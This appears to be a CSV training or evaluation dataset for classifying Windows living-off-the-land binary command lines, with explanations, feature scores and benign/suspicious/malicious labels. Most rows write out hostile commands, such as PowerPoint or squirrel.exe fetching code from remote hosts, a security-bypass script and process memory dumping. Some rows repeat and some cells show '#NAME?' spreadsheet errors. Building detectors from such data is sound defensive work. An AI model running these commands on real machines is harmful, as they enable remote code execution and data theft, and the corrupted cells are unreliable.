prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label
"Powerpnt.exe ""http://193.168.1.10/TeamsAddinLoader.dll""","Potential use: Download and execute a malicious DLL from a remote server disguised as a legitimate Teams add-in loader.

What it does: Executes PowerPoint and attempts to download and load the DLL from the specified URL, potentially giving the attacker remote access to the compromised machine.",Powerpnt.exe,http://193.168.1.10/TeamsAddinLoader.dll,none,http://193.168.1.10/TeamsAddinLoader.dll,193.168.1.10,none,none,0.65,malicious
"Powerpnt.exe ""http://amaare.mere/TeamsAddinLoader.dll""","This command could potentially download and execute a malicious DLL file from a remote server, allowing an attacker to gain persistence and potentially execute further malicious actions on the compromised machine.",Powerpnt.exe,http://amaare.mere/TeamsAddinLoader.dll,none,http://amaare.mere/TeamsAddinLoader.dll,none,none,none,0.55,suspicious
rcsi.exe bypass.csx,This command may be used to execute a C# script that could potentially bypass security measures on a Windows machine.,rcsi.exe,bypass.csx,none,none,none,none,none,0.45,suspicious
rcsi.exe bypass.csx,This command may be used to execute a C# script that could potentially bypass security measures on a Windows machine.,rcsi.exe,bypass.csx,none,none,none,none,none,0.45,suspicious
"Remote.exe /s ""powershell.exe"" anythinghere","This command can be used to execute PowerShell commands remotely on a Windows machine, potentially allowing an attacker to execute malicious code or commands without being physically present on the machine.",Remote.exe,powershell.exe,none,none,none,/s,none,0.45,suspicious
"Remote.exe /s ""powershell.exe"" anythinghere","This command can be used to execute PowerShell commands remotely on a Windows machine, potentially allowing an attacker to execute malicious code or commands without being physically present on the machine.",Remote.exe,powershell.exe,none,none,none,/s,none,0.45,suspicious
sqldumper.exe 464 0 0x0110,"Potential use: Dumping memory of a running SQL Server process for further analysis.
What it does: Executes the SQL Server process with the specified process ID and generates a memory dump file for analysis.",sqldumper.exe,464,none,0x0110,none,none,none,0.55,suspicious
Sqlps.exe -noprofile,"Potential use: Execute SQL commands without leaving traces in the PowerShell history.

What it does: Launches the SQL Server PowerShell module without loading the user's PowerShell profile.",Sqlps.exe,none,none,none,none,#NAME?,none,0.15,benign
SQLToolsPS.exe -noprofile -command Start-Process calc.exe,"This command can be used to execute the Windows calculator (calc.exe) through SQLToolsPS.exe, potentially allowing an attacker to bypass security measures and run arbitrary code on the target machine.",SQLToolsPS.exe,calc.exe,none,none,none," -noprofile,-command,Start-Process",none,0.55,suspicious
squirrel.exe --download [http://10.10.10.1],"Potential use: Downloading a file from a remote server.
What it does: Downloads a file from the specified URL using the Squirrel framework.",squirrel.exe,http://10.10.10.1,none,http://10.10.10.1,10.10.10.1,#NAME?,none,0.75,malicious
squirrel.exe --download [http://11.1.1.1],"Potential use: Downloading a file from a remote server.
What it does: Downloads a file from the specified URL using the Squirrel installer framework.",squirrel.exe,http://11.1.1.1,none,http://11.1.1.1,11.1.1.1,#NAME?,none,0.75,malicious
squirrel.exe --download [http://nice.domain],This command can be used to download a file from a specified URL and potentially execute it on the Windows machine.,squirrel.exe,http://nice.domain,none,http://nice.domain,nice.domain,#NAME?,none,0.75,malicious
squirrel.exe --update [http://10.10.10.1],"This command updates the Squirrel framework from a specified URL, which could potentially be used to download and execute malicious code on a Windows machine.",squirrel.exe,http://10.10.10.1,none,http://10.10.10.1,10.10.10.1,#NAME?,none,0.75,malicious
squirrel.exe --update [http://11.1.1.1],This command updates the Squirrel framework and could potentially be used to download and execute malicious code from a remote server.,squirrel.exe,http://11.1.1.1,none,http://11.1.1.1,11.1.1.1,#NAME?,none,0.75,malicious
